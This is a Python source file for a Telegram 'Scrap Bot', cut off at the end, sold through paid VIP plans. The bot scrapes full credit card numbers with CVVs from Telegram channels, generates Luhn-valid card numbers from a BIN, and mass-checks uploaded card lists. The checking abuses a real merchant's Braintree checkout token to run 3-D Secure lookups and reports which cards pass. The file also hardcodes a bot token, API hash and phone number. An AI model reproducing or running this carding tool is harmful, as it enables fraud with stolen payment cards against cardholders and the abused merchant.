# /admin
# /scr
# /gen 
# /code {hours} for make code to make one vip
# /redeem {code} to redeem the code
# /bin
# /And Other but i forget😂😂
from bs4 import BeautifulSoup
import pycountry
import random
import datetime
import re
import requests
import json
import time
import telebot
import os
from genfun import gen_card
import asyncio
from telethon import TelegramClient
from telebot import types
import user_agent
import threading
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton


# إعدادات الاتصال
bot_token = '7731481404:AAGsWUypRAbyHVbmVpByoP5zIXBjOmjpB2w'
admin_id = '6332270659'  # يجب استبداله بمعرف المدير الصحيح
api_id = '6332270659'  # يجب استبداله بالمعرف API الخاص بك
api_hash = '504e5a1c630d0c668fd94e744e6538aa'  # يجب استبداله بالهاش API الخاص بك
phone_number = '+201004709692'  # يجب استبداله برقم الهاتف الخاص بك
cache_file = "bin_cache.json"
bot_working = True
banned_users = set()
admins = set([5874348944])#ايديك هنا بدل كلمه id
users = {}

broadcast_list = []
def get_statistics():
    total_users = len(users)
    last_users = list(users.keys())[-10:]
    last_users_str = "\n".join([f"@{users[user_id]['username']}" for user_id in last_users])
    return f"Total Users: {total_users}\nLast 10 Users:\n{last_users_str}"


def broadcast_message(message):
    for user_id in broadcast_list:
        try:
            bot.send_message(user_id, message)
        except:
            pass

def get_admin_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="manage_users"))
    return markup

def get_manage_users_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🚫 حضر مستخدم", callback_data="ban_user"))
    markup.add(InlineKeyboardButton("🔓 فك الحضر", callback_data="unban_user"))
    markup.add(InlineKeyboardButton("➕ إضافة أدمن", callback_data="add_admin"))
    markup.add(InlineKeyboardButton("➖ حذف أدمن", callback_data="remove_admin"))
    return markup


if os.path.exists(cache_file):
    with open(cache_file, "r") as file:
        bin_cache = json.load(file)
else:
    bin_cache = {}

def save_cache():
    with open(cache_file, "w") as file:
        json.dump(bin_cache, file)

def generate_cards(bin, count, expiry_month=None, expiry_year=None, use_backticks=False):
    cards = set()
    while len(cards) < count:
        try:
            card_number = bin + str(random.randint(0, 10**(16-len(bin)-1) - 1)).zfill(16-len(bin))
            if luhn_check(card_number):
                expiry_date = generate_expiry_date(current_year, current_month, expiry_month, expiry_year)
                cvv = str(random.randint(0, 999)).zfill(3)
                card = f"{card_number}|{expiry_date['month']}|{expiry_date['year']}|{cvv}"
                if use_backticks:
                    card = f"`{card}`"
                cards.add(card)
        except ValueError:
            continue
    return list(cards)

def generate_expiry_date(current_year, current_month, expiry_month=None, expiry_year=None):
    month = str(expiry_month if expiry_month and expiry_month != 'xx' else random.randint(1, 12)).zfill(2)
    year = str(expiry_year if expiry_year and expiry_year != 'xx' else random.randint(current_year, current_year + 5)).zfill(2)
    if int(year) == current_year and int(month) < current_month:
        month = str(random.randint(current_month, 12)).zfill(2)
    return {"month": month, "year": year}

def luhn_check(number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0

def get_bin_info(bin):
    if bin in bin_cache:
        return bin_cache[bin]
    
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin[:6]}")
        response.raise_for_status()
        data = response.json()
        info = {
            "scheme": data.get("scheme", "").upper(),
            "type": data.get("type", "").upper(),
            "brand": data.get("brand", "").upper(),
            "bank": data.get("bank", {}).get("name", "").upper(),
            "country": data.get("country", {}).get("name", "").upper(),
            "emoji": data.get("country", {}).get("emoji", "")
        }
        bin_cache[bin] = info
        save_cache()
        return info
    except Exception as e:
        print(f"Error fetching BIN info: {e}")
        return {
            "scheme": "",
            "type": "",
            "brand": "",
            "bank": "",
            "country": "",
            "emoji": ""
        }

# تهيئة البوت
bot = telebot.TeleBot(bot_token, parse_mode='HTML')

async def get_last_messages(username, limit, bin=None):
    async with TelegramClient(phone_number, api_id, api_hash) as client:
        try:
            entity = await client.get_entity(username)
            messages = await client.get_messages(entity, limit=limit)

            matching_texts = []
            card_pattern = r'(\d{15,16})[^0-9]+([0-9]{1,2})[^0-9]+([0-9]{2,4})[^0-9]+([0-9]{3,4})'

            for message in messages:
                if message.text:
                    match = re.search(card_pattern, message.text)
                    if match:
                        formatted_text = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
                        if bin is None or formatted_text.startswith(bin):
                            matching_texts.append(formatted_text)

            return "\n".join(matching_texts), entity.title
        except Exception as e:
            print(f"Error: {e}")
            return None, None

def save_to_file(text):
    if os.path.exists('Saoud_Scrap.txt'):
        os.remove('Saoud_Scrap.txt')
    with open('Saoud_Scrap.txt', 'w') as file:
        file.write(text)
token =(bot_token)
@bot.message_handler(commands=['start'])
def my_function(message):
		if message.chat.type == "private":
		              ch = "saoud_cc"
		              idu = message.chat.id
		              join = requests.get(f"https://api.telegram.org/bot{token}/getChatMember?chat_id=@{ch}&user_id={idu}").text
		if '"status":"left"' in join:
                    bot.send_message(message.chat.id,f"🚸| عذرا عزيزي\n🔰| عليك الاشتراك بقناة البوت\nلتتمكن من استخدامه\n- https://t.me/{ch}\n‼️| اشترك ثم ارسل /start",disable_web_page_preview="true")
    
		else:
			user_id = message.from_user.id
			username = message.from_user.username
			if user_id in banned_users:
			     bot.send_message(user_id, "أنت محظور من استخدام هذا البوت.")
			     return
			     users = {}
			     if user_id not in users:
			     	users[user_id] = {"username": username, "joined": datetime.now()}
			     	broadcast_list.append(user_id)
			gate=''
			name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
		if BL == '𝗙𝗥𝗘𝗘':	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/dj_8s")
			keyboard.add(contact_button)
			random_number = random.randint(33, 82)
			photo_url = f'https://t.me/saoud_cc/5'
			bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
		Plan : {BL}
		Welcome To Scrap Bot
		🤖 Bot Status: ✅
		You Can See Cmds from /cmds
		want vip for free?
		join channel and win on giveways to get              free vip  🎁
		
		       
━━━━━━━━━━━━━━━━━
Owner 
𓆩⏤͟͞SAOUD𓆪
『@dj_8s』</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"✨ JOIN✨", url="https://t.me/saoud_cc")
		keyboard.add(contact_button)
		username = message.from_user.first_name
		random_number = random.randint(33, 82)
		photo_url = f'https://t.me/saoud_cc/5'
		bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption=f'''    
		   Hello {name}
		Plan : {BL}
		Welcome To Scrap Bot
		🤖 Bot Status: ✅
		You Can See Cmds from /cmds
		want vip for free?
		join channel and win on giveways to get              free vip  🎁
		
		  𓆩⏤͟͞SAOUD𓆪     ''',reply_markup=keyboard)
my_thread = threading.Thread(target=my_function)
my_thread.start()
@bot.message_handler(commands=["cmds"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"✨ {BL}  ✨",callback_data='plan')
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b> ━━━━━━━━━━━━━━━━━━━━━━━━
✅ Scrap (Free)
/scr (user) (amount) (bin or bank)

✅ Bin Lookup (Free)
/Bin NUMPER


✅ 3D LOOKUP(VIP ONLY)
/vbv NUMPER|MM|YY|CVV

━━━━━━━━━━━━━━━━━━━━━━━━</b>
''',reply_markup=keyboard)

import re,requests
def brn(ccx):
	ccx=ccx.strip()
	c = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
			yy = yy.split("20")[1]
	r = requests.session()
	user = user_agent.generate_user_agent()
	
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzE0OTY3NTUsImp0aSI6IjBjMjMyYzIzLTExNjYtNDRjZC05NDdlLWMzNzM4NWMyNzZmOSIsInN1YiI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRvbmFjdW1lZGljY29tIn19.g-QQF2HWYcu9y7XRY-bFL7-xZbuOAgTJ-1gpmWt8e3wXpIxCEStzb8DVtJCVXtcEgrlLEF14lHay9dliuS6DcA',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	json_data = {
    'clientSdkMetadata': {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': 'e6ee2f5e-1a2e-405f-a94c-8f926604a491',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		return 'Error Card'
	
	
	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://shop.acumedic.com',
    'referer': 'https://shop.acumedic.com/checkout/4/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	json_data = {
    'amount': '11.38',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'ar-EG',
    'browserScreenHeight': 873,
    'browserScreenWidth': 393,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'workPhoneNumber': None,
        'shippingGivenName': 'snhs',
        'shippingSurname': 'snhs',
        'shippingPhone': '161812518484',
        'acsWindowSize': '03',
        'billingLine1': 'hsvshz',
        'billingLine2': None,
        'billingCity': 'new',
        'billingState': 'GB-ENG',
        'billingPostalCode': '10080',
        'billingCountryCode': 'GB',
        'billingPhoneNumber': '161812518484',
        'billingGivenName': 'snhs',
        'billingSurname': 'shs',
        'shippingLine1': 'hsvshz',
        'shippingLine2': None,
        'shippingCity': 'new',
        'shippingState': 'GB-ENG',
        'shippingPostalCode': '10080',
        'shippingCountryCode': 'GB',
        'email': 'hshs@gmil.com',
    },
    'bin': '535451',
    'dfReferenceId': '1_09ced40f-8c2d-4998-8e47-b9f468036d34',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.99.0',
        'cardinalDeviceDataCollectionTimeElapsed': 15,
        'issuerDeviceDataCollectionTimeElapsed': 3,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzE0OTY3NTUsImp0aSI6IjBjMjMyYzIzLTExNjYtNDRjZC05NDdlLWMzNzM4NWMyNzZmOSIsInN1YiI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRvbmFjdW1lZGljY29tIn19.g-QQF2HWYcu9y7XRY-bFL7-xZbuOAgTJ-1gpmWt8e3wXpIxCEStzb8DVtJCVXtcEgrlLEF14lHay9dliuS6DcA',
    'braintreeLibraryVersion': 'braintree/web/3.99.0',
    '_meta': {
        'merchantAppId': 'shop.acumedic.com',
        'platform': 'web',
        'sdkVersion': '3.99.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': 'e6ee2f5e-1a2e-405f-a94c-8f926604a491',
    },
}
	
	response = requests.post(
    f'https://api.braintreegateway.com/merchants/msf5rf5mg5f3y6fy/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)
	time.sleep(9)
	try:
		vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	except KeyError:
		return 'Unknown Error ⚠️'

	
	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful ✅ '
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required ❌'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'lookup Error ⚠️'
	return vbv
@bot.message_handler(content_types=["document"])
def main(message):
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/dj_8s")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
خطة الVIP تتيح لك استخدام كل الادوات والبوابات في البوت بلا حدود 
يمكنك ايضا فحص البطاقات من خلال ملف 
━━━━━━━━━━━━━━━━━
اسعار الاشتراك في خطة الVIP: 
يوم = 0.50
3 ايام = 2$
اسبوع = 7$ 
شهر = 30$
----------------------------------
طرق الدفع :-
UTSD 
TON 
يورزات ثلاثي 
اسيا سيل اضرب مبلغ مرتين 2
🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯
━━━━━━━━━━━━━━━━━
Owner 
『@dj_8s』</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/dj_8s")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
خطة الVIP تتيح لك استخدام كل الادوات والبوابات في البوت بلا حدود 
يمكنك ايضا فحص البطاقات من خلال ملف 
━━━━━━━━━━━━━━━━━
اسعار الاشتراك في خطة الVIP: 
يوم = 0.50
3 ايام = 2$
اسبوع = 7$ 
شهر = 30$
----------------------------------
طرق الدفع :-
UTSD 
TON 
يورزات ثلاثي 
اسيا سيل اضرب مبلغ مرتين 2
🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯🇸🇯
━━━━━━━━━━━━━━━━━
Owner 
『@dj_8s』</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/dj_8s")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		
		dd = 0
		ch = 0
		otp = 0
		last = 0
		ko = (bot.reply_to(message, "'𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐘𝐎𝐔𝐑 𝐂𝐀𝐑𝐃𝐒...⌛").message_id)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)
		try:
			with open("combo.txt", 'r') as file:
			   lino = file.readlines()
			total = len(lino)
			for cc in lino:
			
				try:
				                data = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
				                bank = data.get('bank', {}).get('name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				                country_flag = data.get('country', {}).get('emoji', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				                country = data.get('country', {}).get('name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				                brand = data.get('scheme', '𝒖𝒏𝒌𝒎𝒏𝒘𝒏')
				                card_type = data.get('type', '𝒖𝒏𝒌𝒎𝒏𝒘𝒏')
				                url = data.get('bank', {}).get('url', '𝒖𝒏𝒌𝒎𝒏𝒘𝒏')
				except Exception:
					bank = country_flag = country = brand = card_type = url = '𝒖𝒏𝒌𝒎𝒏𝒘𝒏'
				try:
					last = str(brn(cc))
				except Exception as e:
					print(e)
				mes = types.InlineKeyboardMarkup(row_width=1)
				mero = types.InlineKeyboardButton(f"{last}", callback_data='u8')
				cm1 = types.InlineKeyboardButton(f"{cc}", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"𝗢𝘁𝗽 ⛔ {ch}", callback_data='x')
				me = "احا"
				cm3 = types.InlineKeyboardButton(f"𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌ {dd}", callback_data='x')
				stop = types.InlineKeyboardButton(f"𝐒𝐓𝐎𝐏 ⚠️ ", callback_data='u8')
				mes.add(mero,cm1, cm2, cm3 ,stop)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐘𝐎𝐔𝐑 𝐂𝐀𝐑𝐃𝐒...⌛''', reply_markup=mes)
				
				msgs = f'''𝐎𝐓𝐏✅ 

- 𝐂𝐚𝐫𝐝 ⇾ {cc} 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Lookup
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾{last}
━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {cc[:6]} - {card_type} - {brand} 
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank} 
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country} - {country_flag} 
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@dj_8s』'''


				msg = f'''𝐏𝐚𝐬𝐬𝐞𝐝 ✅ 
- 𝐂𝐚𝐫𝐝 ⇾ {cc} 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Lookup
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾{last}
━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {cc[:6]} - {card_type} - {brand} 
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank} 
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country} - {country_flag} 
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@dj_8s』'''
				#print(last)
				if "3DS Authenticate Attempt Successful ✅" in last or '3DS Authenticate Successful ✅' in last or 'authenticate_attempt_successful' in last:
					otp += 1
				elif '3DS Challenge Required ❌' in last or '3DS Authenticate Frictionless Failed ❌' in last or '3DS Authenticate Rejected ❌' in last:
					ch += 1
					key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{msgs}</strong>",parse_mode="html",reply_markup=key)
				else:
					dd += 1
					time.sleep(9)
		except:
						pass
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>𓆩𝗞𝗲𝘆 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆𓆪! 👑🌪:  𝐃ev : 『@dj_8s』  »»{timer}
{typ}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='SAOUD-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>
🕸𓆩𝐊𝐞𝐲 𝐂𝐫𝐞𝐚𝐭𝐞𝐝𓆪
🕷🕸🕷🕸🕷🕸🕷🕸🕷🕸                     
├𝗦𝗧𝗔𝗧𝗨𝗦»»»{plan}
├𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻»»»{ig}
├『dj_8s』
├𝑲𝒆𝒚  <code>{pas}</code>	
├𝙐𝙨𝙖𝙜𝙚 /redeem 🕷[𝗞𝗘𝗬]
BOT :@sotp_chk0bot 🕸
</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
print("تم تشغيل البوت")
	
@bot.message_handler(commands=['scr'])
def send_sc_messages(message):
    chat_id = message.chat.id
    initial_message = bot.reply_to(message, "Scraping Started...⏳")
    command_parts = message.text.split()

    if len(command_parts) < 3:
        bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, 
                              text="Command format: /scr [username/bin] [limit]")
        return

    input_data = command_parts[1]
    limit = int(command_parts[2])

    if input_data.isdigit() and len(input_data) >= 6:  # نفترض أن البين يتكون من 6 أرقام على الأقل
        # سكرب من بين
        bin = input_data
        count = limit

        cards = generate_cards(bin, count)
        file_path = "Saoud_Scrap.txt"

        with open(file_path, "w") as file:
            file.write("\n".join(cards))

        bin_info = get_bin_info(bin[:6])

        additional_info = (f'''
            ●●●●●●●●●●●

• Name ~ Saoud Scraperer 🧡, 

• Bin ~ {bin[:10]}\n

• Total Found ~ {count}\n
●●●●●●●●●●●
        ''')

        with open(file_path, "rb") as file:
            bot.send_document(chat_id, file, caption=additional_info)
            bot.delete_message(chat_id=chat_id, message_id=initial_message.message_id)
    else:
        # سكرب من قناة
        username = input_data

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        messages_text, channel_name = loop.run_until_complete(get_last_messages(username, limit))

        if channel_name:
            save_to_file(messages_text)

            file_len = len(messages_text.split('\n')) if messages_text else 0
            captain_info = f"""
●●●●●●●●●●●

• Name ~ Saoud Scraperer 🧡, 

• Channel ~ {channel_name}

• Total Found ~ {file_len}

●●●●●●●●●●●"""

            with open('Saoud_Scrap.txt', 'rb') as file:
                markup = types.InlineKeyboardMarkup()
                
                dev_button = telebot.types.InlineKeyboardButton(text="𝗗𝗘𝗩", url='https://t.me/dj_8s')
                markup.add(dev_button)
                bot.send_document(chat_id, file, caption=captain_info, parse_mode='none', reply_markup=markup)
                bot.delete_message(chat_id=chat_id, message_id=initial_message.message_id)
        else:
            bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, 
                                  text="Failed to get messages from the channel.")

@bot.message_handler(commands=['gen'])
def generate_card(message):
    if bot_working:
        chat_id = message.chat.id
        try:
            initial_message = bot.reply_to(message, "Generating Started...⏳")
            card_info = message.text.split('/gen ', 1)[1]

            def multi_explode(delimiters, string):
                pattern = '|'.join(map(re.escape, delimiters))
                return re.split(pattern, string)
        
            split_values = multi_explode([":", "|", "⋙", " ", "/"], card_info)
            bin_value = ""
            mes_value = ""
            ano_value = ""
            cvv_value = ""
            
            if len(split_values) >= 1:
                bin_value = re.sub(r'[^0-9]', '', split_values[0])
            if len(split_values) >= 2:
                mes_value = re.sub(r'[^0-9]', '', split_values[1])
            if len(split_values) >= 3:
                ano_value = re.sub(r'[^0-9]', '', split_values[2])
            if len(split_values) >= 4:
                cvv_value = re.sub(r'[^0-9]', '', split_values[3])
                
            cards_data = ""
            f = 0
            while f < 10:
                card_number, exp_m, exp_y, cvv = gen_card(bin_value, mes_value, ano_value, cvv_value)
                cards_data += f"<code>{card_number}|{exp_m}|{exp_y}|{cvv}</code>\n"
                f += 1
                
            bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=cards_data, parse_mode='HTML')
        except Exception as e:
